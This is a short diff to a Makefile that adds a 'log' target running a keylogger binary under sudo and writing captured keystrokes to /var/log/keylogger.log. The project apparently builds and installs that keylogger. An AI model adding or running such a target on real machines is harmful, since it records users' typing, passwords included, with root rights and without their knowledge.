@@ -8,6 +8,9 @@ INSTALLDIR=/usr/local/bin
 all: $(SOURCES)
 	$(CC) $(SOURCES) $(CFLAGS) -o $(EXECUTABLE)
 
+log:
+	sudo /usr/local/bin/keylogger /var/log/keylogger.log
+
 install: all
 	mkdir -p $(INSTALLDIR)
 	cp $(EXECUTABLE) $(INSTALLDIR)
